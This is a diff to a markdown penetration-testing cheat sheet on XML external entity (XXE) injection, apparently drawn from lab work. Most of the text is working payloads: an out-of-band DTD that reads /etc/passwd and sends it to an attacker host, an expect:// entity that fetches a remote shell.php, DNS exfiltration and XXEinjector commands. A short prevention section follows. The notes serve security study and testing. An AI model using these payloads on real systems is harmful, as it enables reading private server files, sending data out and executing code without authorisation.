@@ -113,27 +113,40 @@ Sending this request data:
 </contact>
 ```
 ### Out-Of-Band XXE
-1. Upload malicious XNL:
+1. Create xxe.dtd file:
 ```xml
 <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
 %oobxxe;
 ```
-1. Start a web server and access the XML on attacked site
+2. Serve this file
+```bash
+python -m http.server 1337
+```
+3. Send request
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE email [ 
+	<!ENTITY % remote SYSTEM "http://ATTACKER:8000/xxe.dtd">
+	  %remote;
+	  %oobxxe;
+	]>
+	<root>
+		&exfil;
+	</root>
+```
 
-
-##### RCE
-
+#### RCE
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
 ]>
 <root>
-<name></name>
-<tel></tel>
-<email>&company;</email>
-<message></message>
+	<name></name>
+	<tel></tel>
+	<email>&company;</email>
+	<message></message>
 </root>
 ```
 
@@ -210,3 +223,35 @@ or
   %error;
 ]>
 ```
+
+##### DNS exfiltration
+Put data to subdomain and check with tcmpdump.
+`ENCODEDTEXT.our.website.com`
+#### Automation
+https://github.com/enjoiz/XXEinjector
+
+xxe.req
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+
+```shell
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+cat Logs/10.129.201.94/etc/passwd.log 
+```
+
+#### Prevention
+
+Disable https://www.php.net/manual/en/function.libxml-disable-entity-loader.php
+
+https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php
+
+XML:
+- Disable referencing custom `Document Type Definitions (DTDs)`
+- Disable referencing `External XML Entities`
+- Disable `Parameter Entity` processing
+- Disable support for `XInclude`
+- Prevent `Entity Reference Loops`
